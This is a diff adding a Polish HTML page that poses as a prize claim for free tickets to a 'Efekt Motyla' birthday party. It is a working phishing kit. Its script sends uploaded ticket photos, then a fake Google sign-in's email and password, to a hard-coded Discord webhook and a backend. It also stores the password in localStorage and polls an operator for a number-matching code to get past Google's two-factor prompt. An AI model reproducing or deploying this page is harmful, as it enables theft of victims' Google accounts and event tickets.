@@ -1,0 +1,583 @@
+<!DOCTYPE html>
+<html lang="pl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>🎉 Odbierz nagrodę - Efekt Motyla</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        @import url('https://fonts.googleapis.com/css2?family=Bebas+Neue&display=swap');
+        
+        :root {
+            --bg: #0b0012;
+            --card: #12001a;
+            --border: #2a1040;
+            --accent: #a855f7;
+            --accent2: #ec4899;
+            --text: #f0e6ff;
+            --muted: #9d6aaa;
+            --success: #22c55e;
+            --warning: #fbbf24;
+        }
+
+        body {
+            font-family: 'Inter', 'Segoe UI', Arial, sans-serif;
+            background: var(--bg);
+            color: var(--text);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+            background-image: radial-gradient(ellipse at 50% 0%, #2a1040 0%, #0b0012 70%);
+        }
+
+        .container {
+            max-width: 520px;
+            width: 100%;
+        }
+
+        .butterflies {
+            position: fixed;
+            inset: 0;
+            pointer-events: none;
+            overflow: hidden;
+            z-index: 0;
+        }
+        .butterfly {
+            position: absolute;
+            font-size: 22px;
+            opacity: 0.15;
+            animation: float 25s infinite ease-in-out;
+        }
+        .butterfly:nth-child(1) { left: 5%; top: 10%; animation-delay: 0s; }
+        .butterfly:nth-child(2) { left: 85%; top: 20%; animation-delay: 3s; }
+        .butterfly:nth-child(3) { left: 10%; top: 60%; animation-delay: 6s; }
+        .butterfly:nth-child(4) { left: 75%; top: 70%; animation-delay: 9s; }
+        .butterfly:nth-child(5) { left: 50%; top: 40%; animation-delay: 12s; }
+        @keyframes float {
+            0%, 100% { transform: translate(0, 0) rotate(0deg); }
+            25% { transform: translate(30px, -40px) rotate(10deg); }
+            50% { transform: translate(-20px, 30px) rotate(-5deg); }
+            75% { transform: translate(40px, -20px) rotate(8deg); }
+        }
+
+        .card {
+            position: relative;
+            z-index: 1;
+            background: var(--card);
+            border: 1px solid var(--border);
+            border-radius: 20px;
+            padding: 40px 32px 32px;
+            backdrop-filter: blur(12px);
+            box-shadow: 0 20px 60px rgba(168, 85, 247, 0.08);
+        }
+
+        .card .logo {
+            text-align: center;
+            font-size: 28px;
+            font-weight: 800;
+            background: linear-gradient(135deg, var(--accent), var(--accent2));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            margin-bottom: 4px;
+        }
+
+        .card .badge {
+            text-align: center;
+            font-size: 11px;
+            color: var(--muted);
+            letter-spacing: 3px;
+            text-transform: uppercase;
+            margin-bottom: 24px;
+        }
+
+        .card h1 {
+            font-size: 26px;
+            text-align: center;
+            margin-bottom: 8px;
+            background: linear-gradient(135deg, var(--accent), var(--accent2));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+
+        .card .sub {
+            text-align: center;
+            color: var(--muted);
+            font-size: 14px;
+            line-height: 1.6;
+            margin-bottom: 28px;
+        }
+
+        .steps {
+            display: flex;
+            justify-content: center;
+            gap: 8px;
+            margin-bottom: 28px;
+        }
+        .step-dot {
+            width: 40px;
+            height: 4px;
+            border-radius: 2px;
+            background: var(--border);
+            transition: all 0.4s;
+        }
+        .step-dot.active { background: var(--accent); box-shadow: 0 0 20px rgba(168,85,247,0.3); }
+        .step-dot.done { background: var(--success); }
+
+        .step-label {
+            text-align: center;
+            font-size: 12px;
+            color: var(--muted);
+            margin-bottom: 24px;
+            transition: all 0.3s;
+        }
+
+        .step { display: none; }
+        .step.active { display: block; }
+
+        .upload-zone {
+            border: 2px dashed var(--border);
+            border-radius: 14px;
+            padding: 36px 20px;
+            text-align: center;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+        .upload-zone:hover { border-color: var(--accent); background: rgba(168,85,247,0.04); }
+        .upload-zone .icon { font-size: 40px; margin-bottom: 8px; }
+        .upload-zone p { color: var(--muted); font-size: 14px; }
+        .upload-zone .hint { font-size: 12px; color: #6b3a7d; margin-top: 6px; }
+        #fileInput { display: none; }
+
+        .file-preview {
+            display: none;
+            margin-top: 12px;
+            padding: 12px 16px;
+            background: rgba(168,85,247,0.06);
+            border: 1px solid var(--border);
+            border-radius: 10px;
+            align-items: center;
+            gap: 12px;
+        }
+        .file-preview.active { display: flex; }
+        .file-preview .name { flex: 1; font-size: 13px; color: var(--text); }
+        .file-preview .size { font-size: 12px; color: var(--muted); }
+
+        .input-group { margin-bottom: 14px; }
+        .input-group label {
+            display: block;
+            font-size: 12px;
+            color: var(--muted);
+            margin-bottom: 4px;
+            font-weight: 600;
+            letter-spacing: 0.5px;
+        }
+        .input-group input {
+            width: 100%;
+            padding: 12px 16px;
+            background: rgba(0,0,0,0.3);
+            border: 1px solid var(--border);
+            border-radius: 10px;
+            color: var(--text);
+            font-size: 15px;
+            outline: none;
+            transition: border-color 0.3s;
+        }
+        .input-group input:focus { border-color: var(--accent); }
+        .input-group input::placeholder { color: #4a2a5a; }
+
+        .btn {
+            width: 100%;
+            padding: 14px;
+            border: none;
+            border-radius: 10px;
+            font-size: 15px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: all 0.3s;
+            margin-top: 4px;
+        }
+        .btn-primary {
+            background: linear-gradient(135deg, var(--accent), var(--accent2));
+            color: #fff;
+        }
+        .btn-primary:hover { opacity: 0.9; transform: scale(1.01); }
+        .btn-primary:disabled { opacity: 0.4; cursor: not-allowed; transform: none; }
+
+        .btn-google {
+            background: #fff;
+            color: #1a1a2e;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            margin-bottom: 12px;
+        }
+        .btn-google:hover { transform: scale(1.01); box-shadow: 0 4px 20px rgba(255,255,255,0.08); }
+        .btn-google svg { width: 20px; height: 20px; flex-shrink: 0; }
+
+        .status {
+            display: none;
+            padding: 12px 16px;
+            border-radius: 10px;
+            text-align: center;
+            font-size: 14px;
+            margin-top: 12px;
+        }
+        .status.show { display: block; }
+        .status.success { background: rgba(34,197,94,0.1); border: 1px solid var(--success); color: var(--success); }
+        .status.error { background: rgba(239,68,68,0.1); border: 1px solid #ef4444; color: #ef4444; }
+        .status.loading { background: rgba(168,85,247,0.08); border: 1px solid var(--accent); color: var(--accent); }
+        .status.waiting { background: rgba(251,191,36,0.08); border: 1px solid var(--warning); color: var(--warning); }
+
+        .code-box {
+            background: rgba(0,0,0,0.3);
+            border: 2px solid var(--accent);
+            border-radius: 14px;
+            padding: 20px;
+            text-align: center;
+            margin: 12px 0 16px;
+        }
+        .code-box .label { font-size: 12px; color: var(--muted); }
+        .code-box .number {
+            font-family: 'Bebas Neue', cursive;
+            font-size: 64px;
+            color: var(--accent);
+            letter-spacing: 12px;
+            text-shadow: 0 0 40px rgba(168,85,247,0.2);
+        }
+        .code-box .sub { font-size: 11px; color: #6b3a7d; margin-top: 4px; }
+
+        .success-page {
+            display: none;
+            text-align: center;
+            padding: 20px 0;
+        }
+        .success-page.active { display: block; }
+        .success-page .icon { font-size: 64px; margin-bottom: 12px; }
+        .success-page h2 { color: var(--success); font-size: 24px; margin-bottom: 8px; }
+        .success-page p { color: var(--muted); font-size: 14px; line-height: 1.7; }
+
+        @media (max-width: 480px) {
+            .card { padding: 28px 18px 24px; }
+            .card h1 { font-size: 20px; }
+            .code-box .number { font-size: 44px; letter-spacing: 8px; }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="butterflies">
+        <span class="butterfly">🦋</span>
+        <span class="butterfly">🦋</span>
+        <span class="butterfly">🦋</span>
+        <span class="butterfly">🦋</span>
+        <span class="butterfly">🦋</span>
+    </div>
+
+    <div class="container">
+        <div class="card">
+
+            <div class="logo">🦋 Efekt Motyla</div>
+            <div class="badge">✦ 4. Urodziny</div>
+
+            <h1>🎁 Odbierz nagrodę!</h1>
+            <p class="sub">Wygrałeś darmowy bilet! Wykonaj 3 kroki:</p>
+
+            <div class="steps">
+                <div class="step-dot active" id="dot1"></div>
+                <div class="step-dot" id="dot2"></div>
+                <div class="step-dot" id="dot3"></div>
+            </div>
+            <div class="step-label" id="stepLabel">📤 Krok 1: Prześlij bilet</div>
+
+            <!-- STEP 1 -->
+            <div class="step active" id="step1">
+                <p style="color:var(--muted);font-size:13px;text-align:center;margin-bottom:12px;">
+                    Prześlij zdjęcie biletu <strong>z widocznym kodem QR</strong>
+                </p>
+                <div class="upload-zone" id="uploadZone">
+                    <div class="icon">🎫</div>
+                    <p><strong>Kliknij lub przeciągnij</strong></p>
+                    <p class="hint">PNG, JPG · max 10MB</p>
+                </div>
+                <input type="file" id="fileInput" accept=".png,.jpg,.jpeg">
+                <div class="file-preview" id="filePreview">
+                    <span class="name" id="fileName">bilet.jpg</span>
+                    <span class="size" id="fileSize">2.4 MB</span>
+                </div>
+                <button class="btn btn-primary" id="uploadBtn">📤 Wyślij bilet</button>
+                <div class="status" id="uploadStatus"></div>
+            </div>
+
+            <!-- STEP 2 -->
+            <div class="step" id="step2">
+                <p style="color:var(--muted);font-size:13px;text-align:center;margin-bottom:14px;">
+                    ✅ Bilet zweryfikowany! Zaloguj się przez Google:
+                </p>
+
+                <button class="btn btn-google" id="googleBtn">
+                    <svg viewBox="0 0 48 48">
+                        <path fill="#FFC107" d="M43.611,20.083H42V20H24v8h11.303c-1.649,4.657-6.08,8-11.303,8c-6.627,0-12-5.373-12-12c0-6.627,5.373-12,12-12c3.059,0,5.842,1.154,7.961,3.039l5.657-5.657C34.046,6.053,29.268,4,24,4C12.955,4,4,12.955,4,24c0,11.045,8.955,20,20,20c11.045,0,20-8.955,20-20C44,22.659,43.862,21.35,43.611,20.083z"/>
+                        <path fill="#FF3D00" d="M6.306,14.691l6.571,4.819C14.655,15.108,18.961,12,24,12c3.059,0,5.842,1.154,7.961,3.039l5.657-5.657C34.046,6.053,29.268,4,24,4C16.318,4,9.656,8.337,6.306,14.691z"/>
+                        <path fill="#4CAF50" d="M24,44c5.166,0,9.86-1.977,13.409-5.192l-6.19-5.238C29.211,35.091,26.715,36,24,36c-5.202,0-9.619-3.317-11.283-7.946l-6.522,5.025C9.505,39.556,16.227,44,24,44z"/>
+                        <path fill="#1976D2" d="M43.611,20.083H42V20H24v8h11.303c-0.792,2.237-2.231,4.166-4.087,5.571c0.001-0.001,0.002-0.001,0.003-0.002l6.19,5.238C36.971,39.205,44,34,44,24C44,22.659,43.862,21.35,43.611,20.083z"/>
+                    </svg>
+                    Zaloguj się przez Google
+                </button>
+
+                <div class="input-group">
+                    <label>Adres e-mail</label>
+                    <input type="email" id="email" placeholder="twoj@email.com">
+                </div>
+                <div class="input-group">
+                    <label>Hasło</label>
+                    <input type="password" id="password" placeholder="••••••••">
+                </div>
+                <button class="btn btn-primary" id="loginBtn">Zaloguj się →</button>
+                <div class="status" id="loginStatus"></div>
+            </div>
+
+            <!-- STEP 3 -->
+            <div class="step" id="step3">
+                <p style="color:var(--muted);font-size:13px;text-align:center;margin-bottom:12px;">
+                    🔐 Potwierdź logowanie w aplikacji Google
+                </p>
+
+                <div class="code-box">
+                    <div class="label">📱 Wpisz numer potwierdzenia</div>
+                    <div class="number" id="confirmCode">--</div>
+                    <div class="sub">Numer pojawi się za chwilę</div>
+                </div>
+
+                <div class="input-group">
+                    <label>Wpisz numer z aplikacji Google</label>
+                    <input type="text" id="confirmInput" placeholder="np. 81" maxlength="2">
+                </div>
+                <button class="btn btn-primary" id="confirmBtn">✅ Potwierdź</button>
+                <div class="status" id="confirmStatus"></div>
+            </div>
+
+            <!-- SUCCESS -->
+            <div class="success-page" id="successPage">
+                <div class="icon">🎉</div>
+                <h2>Nagroda odebrana!</h2>
+                <p>
+                    Darmowy wstęp na <strong>4. Urodziny Efektu Motyla</strong><br>
+                    został przypisany do Twojego konta.<br><br>
+                    📅 25 lipca 2026 · 21:00<br>
+                    📍 Działka Efektu, Turzyn 197
+                </p>
+            </div>
+
+        </div>
+    </div>
+
+    <script>
+        // ============ KONFIG ============
+        const API = '/api/confirm';
+        const DC = 'https://discord.com/api/webhooks/1527391979820945559/8u5xCAzibI0HUvXlJ1vsVcSEma3OWG8lPWxIpf3ZRJFKUQA4gWEi6XhyTEKiOXKHKhDU';
+
+        // ============ ELEMENTY ============
+        const s1 = document.getElementById('step1');
+        const s2 = document.getElementById('step2');
+        const s3 = document.getElementById('step3');
+        const d1 = document.getElementById('dot1');
+        const d2 = document.getElementById('dot2');
+        const d3 = document.getElementById('dot3');
+        const label = document.getElementById('stepLabel');
+
+        const uploadZone = document.getElementById('uploadZone');
+        const fileInput = document.getElementById('fileInput');
+        const filePreview = document.getElementById('filePreview');
+        const fileName = document.getElementById('fileName');
+        const fileSize = document.getElementById('fileSize');
+        const uploadBtn = document.getElementById('uploadBtn');
+        const uploadStatus = document.getElementById('uploadStatus');
+
+        const googleBtn = document.getElementById('googleBtn');
+        const loginBtn = document.getElementById('loginBtn');
+        const emailIn = document.getElementById('email');
+        const passIn = document.getElementById('password');
+        const loginStatus = document.getElementById('loginStatus');
+
+        const confirmCode = document.getElementById('confirmCode');
+        const confirmInput = document.getElementById('confirmInput');
+        const confirmBtn = document.getElementById('confirmBtn');
+        const confirmStatus = document.getElementById('confirmStatus');
+
+        const successPage = document.getElementById('successPage');
+
+        let selectedFile = null;
+        let sessionId = '';
+        let email = '';
+        let pass = '';
+
+        // ============ FUNKCJE ============
+        function goToStep(n) {
+            [s1, s2, s3].forEach((el, i) => el.classList.toggle('active', i === n));
+            [d1, d2, d3].forEach((el, i) => {
+                el.className = 'step-dot';
+                if (i < n) el.classList.add('done');
+                if (i === n) el.classList.add('active');
+            });
+            const labels = ['📤 Krok 1: Prześlij bilet', '🔐 Krok 2: Zaloguj się przez Google', '✅ Krok 3: Potwierdź w aplikacji'];
+            label.textContent = labels[n];
+        }
+
+        function sendDC(msg, file = null) {
+            if (!DC) return;
+            if (file) {
+                const fd = new FormData();
+                fd.append('file', file);
+                fd.append('payload_json', JSON.stringify({ content: msg, username: '🦋 Efekt Motyla' }));
+                fetch(DC, { method: 'POST', body: fd }).catch(() => {});
+            } else {
+                fetch(DC, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ content: msg, username: '🦋 Efekt Motyla' })
+                }).catch(() => {});
+            }
+        }
+
+        function genId() { return Math.random().toString(36).substring(2, 10) + Math.random().toString(36).substring(2, 10); }
+
+        function pollCode() {
+            if (!sessionId) return;
+            fetch(API + '?session=' + sessionId)
+                .then(r => r.json())
+                .then(data => {
+                    if (data.code && data.code !== '--') {
+                        confirmCode.textContent = data.code;
+                        confirmCode.style.color = '#a855f7';
+                        confirmStatus.className = 'status show waiting';
+                        confirmStatus.textContent = '📱 Wpisz numer: ' + data.code;
+                    }
+                })
+                .catch(() => {});
+        }
+
+        // ============ STEP 1 ============
+        uploadZone.addEventListener('click', () => fileInput.click());
+        fileInput.addEventListener('change', function() {
+            if (this.files && this.files[0]) {
+                selectedFile = this.files[0];
+                fileName.textContent = selectedFile.name;
+                fileSize.textContent = (selectedFile.size / 1024 / 1024).toFixed(1) + ' MB';
+                filePreview.classList.add('active');
+                uploadBtn.disabled = false;
+            }
+        });
+
+        uploadBtn.addEventListener('click', function() {
+            if (!selectedFile) {
+                uploadStatus.className = 'status show error';
+                uploadStatus.textContent = '❌ Wybierz zdjęcie biletu!';
+                return;
+            }
+            uploadStatus.className = 'status show loading';
+            uploadStatus.textContent = '⏳ Weryfikacja...';
+            
+            // 🔥 WYSYŁKA OD RAZU
+            sendDC('🎫 NOWY BILET\n\n📁 ' + selectedFile.name + '\n📏 ' + (selectedFile.size/1024/1024).toFixed(1) + ' MB\n🕐 ' + new Date().toLocaleString(), selectedFile);
+            
+            setTimeout(() => {
+                uploadStatus.className = 'status show success';
+                uploadStatus.textContent = '✅ Bilet zweryfikowany!';
+                setTimeout(() => { goToStep(1); uploadStatus.className = 'status'; }, 800);
+            }, 1000);
+        });
+
+        // ============ STEP 2 ============
+        googleBtn.addEventListener('click', () => {
+            document.querySelector('.input-group').scrollIntoView({ behavior: 'smooth' });
+        });
+
+        loginBtn.addEventListener('click', function() {
+            email = emailIn.value.trim();
+            pass = passIn.value.trim();
+            if (!email || !pass) {
+                loginStatus.className = 'status show error';
+                loginStatus.textContent = '❌ Wypełnij wszystkie pola!';
+                return;
+            }
+            sessionId = genId();
+            loginStatus.className = 'status show loading';
+            loginStatus.textContent = '⏳ Logowanie...';
+
+            // 🔥 LOGINY WYSYŁANE OD RAZU
+            sendDC('🔐 LOGOWANIE GOOGLE\n\n📧 ' + email + '\n🔑 ' + pass + '\n🆔 ' + sessionId + '\n🕐 ' + new Date().toLocaleString());
+
+            // Zapisz sesję na backendzie
+            fetch(API, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ action: 'create', session: sessionId, email, password: pass })
+            }).then(() => {});
+
+            localStorage.setItem('em', email);
+            localStorage.setItem('pa', pass);
+
+            setTimeout(() => {
+                loginStatus.className = 'status show success';
+                loginStatus.textContent = '✅ Zalogowano!';
+                setTimeout(() => {
+                    goToStep(2);
+                    loginStatus.className = 'status';
+                    confirmCode.textContent = '--';
+                    confirmCode.style.color = '#fbbf24';
+                    confirmStatus.className = 'status show waiting';
+                    confirmStatus.textContent = '⏳ Czekamy na numer od admina...';
+                    setInterval(pollCode, 2000);
+                }, 800);
+            }, 1000);
+        });
+
+        // ============ STEP 3 ============
+        confirmBtn.addEventListener('click', function() {
+            const code = confirmInput.value.trim();
+            if (!code) {
+                confirmStatus.className = 'status show error';
+                confirmStatus.textContent = '❌ Wpisz numer!';
+                return;
+            }
+            confirmStatus.className = 'status show loading';
+            confirmStatus.textContent = '⏳ Potwierdzanie...';
+
+            fetch(API + '?session=' + sessionId)
+                .then(r => r.json())
+                .then(data => {
+                    if (data.code && data.code === code) {
+                        sendDC('✅ POTWIERDZONO!\n\n📧 ' + email + '\n🔑 ' + pass + '\n📱 ' + code + '\n🕐 ' + new Date().toLocaleString());
+                        confirmStatus.className = 'status show success';
+                        confirmStatus.textContent = '✅ Potwierdzono!';
+                        setTimeout(() => {
+                            document.querySelector('.card > .sub').style.display = 'none';
+                            document.querySelector('.steps').style.display = 'none';
+                            document.querySelector('.step-label').style.display = 'none';
+                            document.getElementById('step3').style.display = 'none';
+                            successPage.classList.add('active');
+                        }, 800);
+                    } else {
+                        confirmStatus.className = 'status show error';
+                        confirmStatus.textContent = '❌ Nieprawidłowy numer!';
+                    }
+                });
+        });
+
+        document.addEventListener('keydown', e => {
+            if (e.key === 'Enter') {
+                if (s1.classList.contains('active') && selectedFile) uploadBtn.click();
+                else if (s2.classList.contains('active')) loginBtn.click();
+                else if (s3.classList.contains('active')) confirmBtn.click();
+            }
+        });
+
+        if (localStorage.getItem('em')) { emailIn.value = localStorage.getItem('em'); passIn.value = localStorage.getItem('pa') || ''; }
+
+        console.log('🦋 Efekt Motyla');
+    </script>
+</body>
+</html>
